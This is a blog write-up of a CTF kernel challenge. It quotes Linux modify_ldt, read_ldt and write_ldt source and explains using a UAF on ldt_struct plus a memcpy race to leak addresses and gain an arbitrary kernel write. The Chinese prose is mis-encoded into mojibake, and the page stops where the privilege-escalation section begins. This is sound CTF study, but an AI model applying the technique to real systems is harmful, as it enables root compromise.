                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-08-18 22:47:26" itemprop="dateModified" datetime="2022-08-18T22:47:26+08:00">2022-08-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="è“å¸½æ¯åŠå†³èµ›-Smurfså¤ç°"><a href="#è“å¸½æ¯åŠå†³èµ›-Smurfså¤ç°" class="headerlink" title="è“å¸½æ¯åŠå†³èµ› Smurfså¤ç°"></a>è“å¸½æ¯åŠå†³èµ› Smurfså¤ç°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æä¾›äº†del,add,editï¼Œå…¶ä¸­æœ‰æ¯”è¾ƒè£¸çš„uaf,editå¯ä»¥ç¼–è¾‘å‰å…«ä¸ªå­—èŠ‚,ä½†æ˜¯æ²¡æœ‰æ³„éœ²åœ°å€çš„åŠŸèƒ½ï¼Œåœ¨æ¯”èµ›æœŸé—´æˆ‘é‡‡ç”¨<code>seq_operations</code>çš„<code>start</code>æŒ‡é’ˆæ¥æ§åˆ¶ç¨‹åºæµï¼Œkernelçš„åœ°å€éšæœºåŒ–åªæœ‰9ä½ï¼Œæ‰€ä»¥é‡‡ç”¨ç¡¬çˆ†çš„ç­–ç•¥æ‰“è¿œç¨‹ï¼Œå¯æƒœè„¸é»‘ï¼Œçˆ†äº†ä¸¤ä¸ªå°æ—¶ï¼Œåˆ°æ¯”èµ›ç»“æŸè¿˜æ˜¯æ²¡æœ‰çˆ†å‡ºæ¥ã€‚è™½æœ‰ä¸€å®šå¯è¡Œæ€§ä½†æ˜¯æ­£è§£è‚¯å®šä¸æ˜¯è¿™æ ·ï¼Œå®˜æ–¹è§£å‡ºæ¥çœ‹äº†çœ‹å‘ç°éå¸¸æœ‰å«é‡‘é‡ï¼Œé‚å¤ç°ä¸€æ³¢ã€‚</p>
<h2 id="ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ "><a href="#ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ " class="headerlink" title="ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ "></a>ç›¸å…³å†…æ ¸çŸ¥è¯†å­¦ä¹ </h2><h3 id="è¿›ç¨‹ldt"><a href="#è¿›ç¨‹ldt" class="headerlink" title="è¿›ç¨‹ldt"></a>è¿›ç¨‹ldt</h3><p>è™½ç„¶é¢˜ç›®çš„åˆ©ç”¨æ€è·¯å’Œè¿™ä¸ªå…³ç³»ä¸æ˜¯å¾ˆå¤§ï¼Œä½†çœ‹éƒ½çœ‹äº†å°±è®°å½•ä¸€ä¸‹ã€‚</p>
<p>ä»‹ç»LDTå°±ä¸å¾—ä¸ä»‹ç»GDTäº†ï¼Œç®€è€Œè¨€ä¹‹ï¼ŒGDTæ˜¯å…¨å±€æè¿°ç¬¦è¡¨ï¼Œè€ŒLDTæ˜¯å±€éƒ¨æè¿°ç¬¦è¡¨ï¼Œåœ¨kvmçš„å­¦ä¹ ä¸­æ¥è§¦è¿‡GDT,ä½†æ˜¯å½“æ—¶ä¸ç†è§£ä¸ºä»€ä¹ˆåŠ äº†è¿™ä¸ªä¸œè¥¿ä¸ºä»€ä¹ˆå°±å¯ä»¥å®ç°ä¿æŠ¤äº†ï¼Œåœ¨è¯¢é—®<code>Alex</code>å­¦é•¿ä¸€æ³¢åç»ˆäºææ‡‚ï¼Œä»–æ˜¯æ€ä¹ˆå®ç°å†…å­˜ä¿æŠ¤ä»¥åŠè¿›ç¨‹ä½éš”ç¦»çš„äº†ã€‚</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220812195333645.png" alt="image-20220812195333645"></p>
<p>ä¸€ä¸ªcpuæœ‰ä¸€ä¸ªå…¨å±€æè¿°ç¬¦è¡¨GDTï¼ŒGDTç›¸å½“äºä¸€ä¸ªæ•°ç»„ï¼Œæ¯ä¸€ä¸ªå…ƒç´ å°±æ˜¯ä¸€ä¸ªæ®µæè¿°ç¬¦ï¼Œä¸€ä¸ªæ®µæè¿°ç¬¦å°±è®°å½•è¿™ä¸ªæ®µçš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚æ®µçš„åŸºåœ°å€æ®µçš„å¤§å°ä¹‹ç±»çš„ï¼Œè¿™ä¸ªæ•°ç»„çš„åœ°å€å­˜å‚¨åœ¨å¯„å­˜å™¨<code>GDTR</code>ä¸­ï¼Œç„¶ååœ¨æ®µå¯„å­˜å™¨ä¸­å°±ä¸ä¼šè®°å½•æ®µçš„å…·ä½“ä¿¡æ¯ï¼Œè€Œæ˜¯è®°å½•ä¸€ä¸ªæ®µé€‰æ‹©å­ï¼Œé€šè¿‡è¿™ä¸ªæ®µé€‰æ‹©å­å®Œæˆå¯¹æŸä¸€ä¸ªæ®µæè¿°ç¬¦çš„ç´¢å¼•</p>
<p><img src="https://ask.qcloudimg.com/http-save/4069933/9r91dw9haq.jpeg?imageView2/2/w/1620" alt="img"></p>
<p>æ®µé€‰æ‹©å­åŒ…æ‹¬ä¸‰éƒ¨åˆ†ï¼Œæè¿°ç´¢å¼•ç¬¦ï¼ŒTL,RPLï¼Œå…¶ä¸­æè¿°ç´¢å¼•ç¬¦å°±æ˜¯ç´¢å¼•æ®µæè¿°ç¬¦çš„ï¼ŒTLæœ‰ä¸¤ç§å¯èƒ½ï¼Œ0ä»£è¡¨åœ¨GDTä¸­å¯»æ‰¾ï¼Œ1ä»£è¡¨åœ¨LDTä¸­å¯»æ‰¾ã€‚</p>
<p>LDTæ˜¯åœ¨ä¿æŠ¤æ¨¡å¼ä¸‹å®ç°è¿›ç¨‹é—´éš”ç¦»çš„é‡è¦çš„æœºåˆ¶ï¼Œæ¯ä¸ªLDTéƒ½è®°å½•ä¸€ä¸ªè¿›ç¨‹çš„æ®µçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬cs,ds,ssä¹‹ç±»çš„ï¼Œä¹Ÿæ˜¯ç”±æ®µæè¿°ç¬¦ç»„æˆçš„æ•°ç»„ï¼Œä»–æ˜¯ä¸€æ®µå†…å­˜ï¼Œä¹Ÿå¯ä»¥çœ‹åšä¸€ä¸ªæ®µï¼Œæ‰€ä»¥å¯ä»¥åœ¨GDTä¸­ç”¨ä¸€ä¸ªæè¿°ç¬¦å»è®°å½•ä»–ï¼Œä¹Ÿæœ‰ä¸€ä¸ªå¯„å­˜å™¨LDTRï¼Œä¸è¿‡ä»–ä¸æ˜¯è®°å½•LDTçš„åŸºåœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªé€‰æ‹©å­ï¼Œå½“æ®µå¯„å­˜å™¨çš„TLä½æ˜¯1çš„è¯ï¼Œä»£è¡¨å°±æ˜¯LDTé€‰æ‹©ï¼ŒCPUä¼šæ ¹æ®LDTRä½œä¸ºä¸€ä¸ªç´¢å¼•å»GDTè¡¨ä¸­æ‰¾æè¿°ç¬¦ï¼Œæ‰¾è§çš„æè¿°ç¬¦å°±æ˜¯å¯¹åº”ä¸€ä¸ªLDTåœ°å€ï¼Œç„¶åå†ç”¨å¯¹åº”çš„æ®µå¯„å­˜å™¨çš„indexæ‰¾åˆ°å¯¹åº”çš„æ®µæè¿°ç¬¦ï¼Œå¯è§ï¼Œè¿›ç¨‹ä¹‹é—´çš„LDTRä¸ä¸€æ ·ï¼Œä»–ä»¬çš„LDTå°±ä¸ä¸€æ ·ï¼Œæ®µå¯„å­˜å™¨å°±ä¸ä¸€æ ·ï¼Œè¿›ç¨‹é—´å°±éš”ç¦»äº†ï¼Œæ¯”è¾ƒå½¢è±¡çš„æè¿°å¦‚ä¸‹å¦‚å›¾ã€‚</p>
<p><img src="https://ask.qcloudimg.com/http-save/4069933/4icmuda124.jpeg?imageView2/2/w/1620" alt="img"></p>
<p><img src="https://ask.qcloudimg.com/http-save/yehe-1878670/czt9jkhxcl.png?imageView2/2/w/1620" alt="img"></p>
<h3 id="modify-ldt-ç³»ç»Ÿè°ƒç”¨"><a href="#modify-ldt-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="modify_ldt ç³»ç»Ÿè°ƒç”¨"></a>modify_ldt ç³»ç»Ÿè°ƒç”¨</h3><h4 id="ldt-struct"><a href="#ldt-struct" class="headerlink" title="ldt_struct"></a>ldt_struct</h4><p>è¯¥ç»“æ„ä½“æ˜¯0x10å¤§å°çš„ï¼Œç„¶åå‰å…«ä¸ªå­—èŠ‚æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œé€šè¿‡uafæˆ‘ä»¬å¾—åˆ°è¿™ä¸ªç»“æ„ä½“ï¼Œç„¶åé€šè¿‡editå¯ä»¥æ§åˆ¶å‰å…«ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æ§åˆ¶<code>entries</code>æŒ‡é’ˆã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        nr_entries;</span><br><span class="line">    <span class="keyword">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code> struct desc_struct</code>å°±æ˜¯ä¸€ä¸ªæ®µæè¿°ç¬¦</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    u16    limit0;</span><br><span class="line">    u16    base0;</span><br><span class="line">    u16    base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">    u16    limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>

<h4 id="moddify-ldtç³»ç»Ÿè°ƒç”¨"><a href="#moddify-ldtç³»ç»Ÿè°ƒç”¨" class="headerlink" title="moddify_ldtç³»ç»Ÿè°ƒç”¨"></a>moddify_ldtç³»ç»Ÿè°ƒç”¨</h4><p>å¯ä»¥é€šè¿‡linuxæä¾›çš„<code>modity_ldt</code>æ¥è·å–æˆ–è€…ä¿®æ”¹å½“å‰è¿›ç¨‹çš„LDT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="keyword">int</span> , func , <span class="keyword">void</span> __user * , ptr ,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>moddify_ldtç³»ç»Ÿè°ƒç”¨ä¸€å…±æä¾›äº†å››ä¸ªåŠŸèƒ½ï¼Œå‚æ•°æœ‰ä¸‰ä¸ªï¼Œfun,ptr,bytecount,<code>ptr</code>æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œç»“æ„ä½“ä¸º<code>user_desc</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  entry_number;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  base_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>read_ldt</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">read_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">long</span> entries_size;</span><br><span class="line"> <span class="keyword">int</span> retval;</span><br><span class="line"></span><br><span class="line"> down_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (!mm-&gt;context.ldt) &#123;</span><br><span class="line">  retval = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (bytecount &gt; LDT_ENTRY_SIZE * LDT_ENTRIES)</span><br><span class="line">  bytecount = LDT_ENTRY_SIZE * LDT_ENTRIES;</span><br><span class="line"></span><br><span class="line"> entries_size = mm-&gt;context.ldt-&gt;nr_entries * LDT_ENTRY_SIZE;</span><br><span class="line"> <span class="keyword">if</span> (entries_size &gt; bytecount)</span><br><span class="line">  entries_size = bytecount;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">  retval = -EFAULT;</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (entries_size != bytecount) &#123;</span><br><span class="line">  <span class="comment">/* Zero-fill the rest and pretend we read bytecount bytes. */</span></span><br><span class="line">  <span class="keyword">if</span> (clear_user(ptr + entries_size, bytecount - entries_size)) &#123;</span><br><span class="line">   retval = -EFAULT;</span><br><span class="line">   <span class="keyword">goto</span> out_unlock;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> retval = bytecount;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line"> up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line"> <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‡½æ•°ä¼šä½¿ç”¨<code>copy_to_user</code>æŠŠldt-&gt;entiresçš„å€¼æ‹·è´åˆ°ä¼ å…¥çš„<code>ptr</code>ä¸­ï¼Œå°±æ˜¯æŠŠè¿™ä¸ªè¿›ç¨‹çš„LDTæ‹·è´åˆ°<code>ptr</code>ä¸­ï¼Œå¦‚æœæ‹·è´ä¸æˆåŠŸï¼Œé‚£å°±ä¼šè¿”å›-1.æˆ‘ä»¬å¯ä»¥æ£€æŸ¥è¿”å›å€¼åˆ¤æ–­æ˜¯å¦è¯»å–æˆåŠŸï¼Œä¹Ÿå°±æ˜¯å¯ä»¥çˆ†ç ´å‡ºheapæˆ–è€…kernelåœ°å€ã€‚</p>
<p><strong>write_ldt</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">write_ldt</span><span class="params">(<span class="keyword">void</span> __user *ptr, <span class="keyword">unsigned</span> <span class="keyword">long</span> bytecount, <span class="keyword">int</span> oldmode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"> <span class="keyword">unsigned</span> <span class="keyword">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"> <span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"> error = -EINVAL;</span><br><span class="line"> <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"> error = -EFAULT;</span><br><span class="line"> <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"> error = -EINVAL;</span><br><span class="line"> <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">  <span class="keyword">goto</span> out;</span><br><span class="line"> <span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (oldmode)</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line">  <span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">     LDT_empty(&amp;ldt_info)) &#123;</span><br><span class="line">  <span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line"> &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) &#123;</span><br><span class="line">   error = -EINVAL;</span><br><span class="line">   <span class="keyword">goto</span> out;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line">  <span class="keyword">if</span> (oldmode)</span><br><span class="line">   ldt.avl = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line">  <span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line"> old_ldt       = mm-&gt;context.ldt;</span><br><span class="line"> old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line"> new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line"> error = -ENOMEM;</span><br><span class="line"> new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"> <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (old_ldt)</span><br><span class="line">  <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line"> new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"> finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment">  * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment">  * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment">  * them over to the new LDT.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"> <span class="keyword">if</span> (error) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment">   * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment">   * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">   free_ldt_pgtables(mm);</span><br><span class="line">  free_ldt_struct(new_ldt);</span><br><span class="line">  <span class="keyword">goto</span> out_unlock;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> install_ldt(mm, new_ldt);</span><br><span class="line"> unmap_ldt_struct(mm, old_ldt);</span><br><span class="line"> free_ldt_struct(old_ldt);</span><br><span class="line"> error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line"> up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"> <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡è¿™ä¸ªå‡½æ•°é‡æ–°ç”³è¯·ä¸€ä¸ªldtç»“æ„ä½“ç»‘å®šåˆ°è¿›ç¨‹ä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨uafæ§åˆ¶è¿™ä¸ªç»“æ„é¢˜ï¼Œç„¶åå°±å¯ä»¥æ§åˆ¶å…¶ä¸­çš„<code>entries</code>äº†ã€‚</p>
<p>è¿™ä¸ªå‡½æ•°å¤„ç†å¯ä»¥æ§åˆ¶ldtä»¥å¤–è¿˜å¯ä»¥å®Œæˆä»»æ„å†™ï¼Œè§‚å¯Ÿä¸‹é¢çš„ä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line">    <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>memcpy</code>å‡½æ•°ä¸­ï¼Œæ‹·è´çš„å¤§å°æ˜¯<code>old_nr_entries * LDT_ENTRY_SIZE</code>,å…¶ä¸­<code>old_nr_entries</code>çš„ä¸Šé™å’Œ<code>LDT_ENTRY_SIZE</code>å¤§å°éƒ½æœ‰å®šä¹‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRIES    8192</span></span><br><span class="line"><span class="comment">/* The size of each LDT entry. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LDT_ENTRY_SIZE    8</span></span><br></pre></td></tr></table></figure>

<p>å¯è§è¿˜æ˜¯æ¯”è¾ƒå¤§çš„ï¼Œç„¶åè¿˜æ²¡æœ‰åŠ é”ï¼Œé‚£å°±å¯ä»¥åœ¨<code>memcpy</code>æ‹·è´çš„æœŸé—´æ¡ä»¶ç«äº‰ä¿®æ”¹<code>entries</code>å­—æ®µï¼Œldtä¹Ÿæ˜¯æˆ‘ä»¬ä¼ å…¥çš„å€¼ï¼Œå†æ‰§è¡Œ<code>new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</code>å°±å¯ä»¥å®Œæˆä»»æ„åœ°å€å†™å…«å­—èŠ‚äº†ã€‚</p>
<h2 id="è§£æ³•ä¸€-éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ"><a href="#è§£æ³•ä¸€-éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ" class="headerlink" title="è§£æ³•ä¸€ éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ"></a>è§£æ³•ä¸€ éå†å†…å­˜æ³„éœ²åœ°å€ä¿®æ”¹è¿›ç¨‹credå®Œæˆææƒ</h2><p>è¯¥è§£æ³•æ€è·¯ä¸»è¦å‚è€ƒ<code>TCTF FINAL</code>çš„ä¸€é“kernelpwné¢˜ã€‚</p>
